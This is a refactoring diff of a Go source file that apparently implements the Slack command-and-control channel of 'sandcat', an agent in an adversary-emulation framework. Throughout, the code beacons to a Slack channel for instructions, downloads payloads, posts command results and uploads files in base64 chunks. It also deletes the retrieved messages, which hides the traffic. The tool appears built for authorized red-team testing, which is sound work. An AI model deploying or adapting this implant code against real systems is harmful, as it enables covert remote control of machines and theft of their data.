@@ -24,27 +24,29 @@ const (
 	slackError = 500
 	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon slack response before giving up.
 	beaconWait = 10 // number of seconds to wait for beacon slack response in case of initial failure.
-	maxDataChunkSize = 750000 // SLACK has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
+	maxDataChunkSize = 750000 // Slack has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
+	slackDeleteEndpoint = "https://slack.com/api/chat.delete"
+	slackUploadFileEndpoint = "https://slack.com/api/files.upload"
+	slackPostMessageEndpoint = "https://slack.com/api/chat.postMessage"
+	slackHistoryEndpointTemplate = "https://slack.com/api/conversations.history?channel=%s&oldest=%d"
 )
 
 var (
-	token = ""
+	slackToken = ""
 	channelId = "{SLACK_C2_CHANNEL_ID}"
-	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
-	username string
 )
 
-type SLACK struct {
+type Slack struct {
 	name string
 }
 
 func init() {
-	CommunicationChannels["SLACK"] = SLACK{ name: "SLACK" }
+	CommunicationChannels["Slack"] = Slack{ name: "Slack" }
 }
 
 //GetInstructions sends a beacon and returns instructions
-func (g SLACK) GetBeaconBytes(profile map[string]interface{}) []byte {
-	checkValidSleepInterval(profile)
+func (s Slack) GetBeaconBytes(profile map[string]interface{}) []byte {
+	checkValidSlackSleepInterval(profile, slackTimeout, slackTimeoutResetInterval)
 	var retBytes []byte
 	bites, heartbeat := slackBeacon(profile)
 	if heartbeat == true {
@@ -54,7 +56,7 @@ func (g SLACK) GetBeaconBytes(profile map[string]interface{}) []byte {
 }
 
 //GetPayloadBytes load payload bytes
-func (g SLACK) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
+func (s Slack) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
 	var payloadBytes []byte
 	var err error
 	output.VerbosePrint("[+] Attempting to retrieve payload...")
@@ -74,25 +76,25 @@ func (g SLACK) GetPayloadBytes(profile map[string]interface{}, payloadName strin
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
-func (g SLACK) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
+func (s Slack) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
     config := make(map[string]string)
     if len(criteria["c2Key"]) > 0 {
-        token = criteria["c2Key"]
+        slackToken = criteria["c2Key"]
         if len(profile["paw"].(string)) == 0 {
-        	config["paw"] = getBeaconNameIdentifier()
+        	config["paw"] = getRandomIdentifier()
         }
         return true, config
     }
     return false, nil
 }
 
-func (g SLACK) SetUpstreamDestAddr(upstreamDestAddr string) {
+func (s Slack) SetUpstreamDestAddr(upstreamDestAddr string) {
 	// Upstream destination will be the slack API.
 	return
 }
 
 //SendExecutionResults send results to the server
-func (g SLACK) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
+func (s Slack) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
 	profileCopy := make(map[string]interface{})
 	for k,v := range profile {
 		profileCopy[k] = v
@@ -102,16 +104,16 @@ func (g SLACK) SendExecutionResults(profile map[string]interface{}, result map[s
 	slackResults(profileCopy)
 }
 
-func (g SLACK) GetName() string {
-	return g.name
+func (s Slack) GetName() string {
+	return s.name
 }
 
-func (g SLACK) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
+func (s Slack) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
 	encodedFilename := base64.StdEncoding.EncodeToString([]byte(uploadName))
 	paw := profile["paw"].(string)
 
 	// Upload file in chunks
-	uploadId := getNewUploadId()
+	uploadId := getRandomIdentifier()
 	dataSize := len(data)
 	numChunks := int(math.Ceil(float64(dataSize) / float64(maxDataChunkSize)))
 	start := 0
@@ -123,7 +125,7 @@ func (g SLACK) UploadFileBytes(profile map[string]interface{}, uploadName string
 		}
 		chunk := data[start:end]
 		slackDescription := getSlackDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
-		if err := uploadFileChunk(slackName, slackDescription, chunk); err != nil {
+		if err := uploadFileChunkSlack(slackName, slackDescription, chunk); err != nil {
 			return err
 		}
 		start += maxDataChunkSize
@@ -132,17 +134,17 @@ func (g SLACK) UploadFileBytes(profile map[string]interface{}, uploadName string
 }
 
 func getSlackNameForUpload(paw string) string {
-	return getSlackDescriptor("upload", paw)
+	return getDescriptor("upload", paw)
 }
 
 func getSlackDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
 	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
 }
 
-func uploadFileChunk(slackName string, slackDescription string, data []byte) error {
+func uploadFileChunkSlack(slackName string, slackDescription string, data []byte) error {
 	output.VerbosePrint("[-] Uploading file...")
 	if result := createSlackContent(slackName, slackDescription, data); result != true {
-		return errors.New(fmt.Sprintf("Failed to create file upload SLACK. Response code: %s", result))
+		return errors.New(fmt.Sprintf("Failed to create file upload Slack. Response code: %s", result))
 	}
 	return nil
 }
@@ -173,18 +175,18 @@ func createHeartbeatSlack(slackType string, profile map[string]interface{}) bool
 	data, err := json.Marshal(profile)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack heartbeat. Error with profile marshal: %s", err.Error()))
-		output.VerbosePrint("[-] Heartbeat SLACK: FAILED")
+		output.VerbosePrint("[-] Heartbeat Slack: FAILED")
 		return false
 	} else {
 		paw := profile["paw"].(string)
-		slackName := getSlackDescriptor(slackType, paw)
+		slackName := getDescriptor(slackType, paw)
 		slackDescription := slackName
 		if createSlack(slackName, slackDescription, data) != true {
-			output.VerbosePrint("[-] Heartbeat SLACK: FAILED")
+			output.VerbosePrint("[-] Heartbeat Slack: FAILED")
 			return false
 		}
 	}
-	output.VerbosePrint("[+] Heartbeat SLACK: SUCCESS")
+	output.VerbosePrint("[+] Heartbeat Slack: SUCCESS")
 	return true
 }
 
@@ -192,15 +194,15 @@ func slackResults(result map[string]interface{}) {
 	data, err := json.Marshal(result)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack results. Error with result marshal: %s", err.Error()))
-		output.VerbosePrint("[-] Results SLACK: FAILED")
+		output.VerbosePrint("[-] Results Slack: FAILED")
 	} else {
 		paw := result["paw"].(string)
-		slackName := getSlackDescriptor("results", paw)
+		slackName := getDescriptor("results", paw)
 		slackDescription := slackName
 		if createSlack(slackName, slackDescription, data) != true {
-			output.VerbosePrint("[-] Results SLACK: FAILED")
+			output.VerbosePrint("[-] Results Slack: FAILED")
 		} else {
-			output.VerbosePrint("[+] Results SLACK: SUCCESS")
+			output.VerbosePrint("[+] Results Slack: SUCCESS")
 		}
 	}
 }
@@ -213,7 +215,7 @@ func createSlackContent(slackName string, description string, data []byte) bool 
 	requestBody.Set("content", stringified)
 
 	var result map[string]interface{}
-	json.Unmarshal(postFormWithAuth("https://slack.com/api/files.upload", requestBody), &result);
+	json.Unmarshal(postFormWithAuth(slackUploadFileEndpoint, requestBody), &result);
 
 	return result["ok"].(bool);
 }
@@ -233,7 +235,7 @@ func createSlack(slackName string, description string, data []byte) bool {
 	}
 	
 	var result map[string]interface{}
-	json.Unmarshal(postRequestWithAuth("https://slack.com/api/chat.postMessage", requestBody), &result);
+	json.Unmarshal(postRequestWithAuth(slackPostMessageEndpoint, requestBody), &result);
 
 	return result["ok"].(bool);
 }
@@ -243,7 +245,7 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 	var msgs []byte
 
 	var result map[string]interface{}
-	msgs = getRequestWithAuth(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channelId, time.Now().Unix()-slackTimeout*2))
+	msgs = getRequestWithAuth(fmt.Sprintf(slackHistoryEndpointTemplate, channelId, time.Now().Unix()-slackTimeout*2))
 	json.Unmarshal(msgs, &result);
 
 	if result["ok"] == false {
@@ -265,7 +267,7 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 			}
 
 			if (!strings.Contains(slackType,"payloads")) {
-				postRequestWithAuth("https://slack.com/api/chat.delete", requestBody);
+				postRequestWithAuth(slackDeleteEndpoint, requestBody);
 			}
 		}
 	}
@@ -278,7 +280,7 @@ func getSlacks(slackType string, uniqueID string) []string {
 	var msgs []byte
 
 	var result map[string]interface{}
-	msgs = getRequestWithAuth(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channelId, time.Now().Unix()-slackTimeout*2))
+	msgs = getRequestWithAuth(fmt.Sprintf(slackHistoryEndpointTemplate, channelId, time.Now().Unix()-slackTimeout*2))
 	json.Unmarshal(msgs, &result);
 
 	if result["ok"] == false {
@@ -302,37 +304,16 @@ func getSlacks(slackType string, uniqueID string) []string {
 			}
 
 			if (!strings.Contains(slackType,"payloads")) {
-				postRequestWithAuth("https://slack.com/api/chat.delete", requestBody);
+				postRequestWithAuth(slackDeleteEndpoint, requestBody);
 			}
 		}
 	}
 	return contents
 }
 
-
-func getSlackDescriptor(slackType string, uniqueId string) string {
-	return fmt.Sprintf("%s-%s", slackType, uniqueId)
-}
-
-func checkValidSleepInterval(profile map[string]interface{}) {
-	if profile["sleep"] == slackTimeout{
-		time.Sleep(time.Duration(float64(slackTimeoutResetInterval)) * time.Second)
-	}
-}
-
-func getBeaconNameIdentifier() string {
-	rand.Seed(time.Now().UnixNano())
-	return strconv.Itoa(rand.Int())
-}
-
-func getNewUploadId() string {
-	rand.Seed(time.Now().UnixNano())
-	return strconv.Itoa(rand.Int())
-}
-
 func postRequestWithAuth(address string, data []byte) []byte {
 	req, err := http.NewRequest("POST", address, bytes.NewBuffer(data))
-	req.Header.Set("Authorization", "Bearer " + token)
+	req.Header.Set("Authorization", "Bearer " + slackToken)
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("charset", "utf-8")
 	
@@ -359,7 +340,7 @@ func postRequestWithAuth(address string, data []byte) []byte {
 
 func postFormWithAuth(address string, data url.Values) []byte {
 	req, err := http.NewRequest("POST", address, strings.NewReader(data.Encode()))
-	req.Header.Set("Authorization", "Bearer " + token)
+	req.Header.Set("Authorization", "Bearer " + slackToken)
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("charset", "utf-8")
 	
@@ -386,8 +367,7 @@ func postFormWithAuth(address string, data url.Values) []byte {
 
 func getRequestWithAuth(address string) []byte {
 	req, err := http.NewRequest("GET", address, nil)
-	req.Header.Set("Authorization", "Bearer " + token)
-	
+	req.Header.Set("Authorization", "Bearer " + slackToken)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
 		return nil
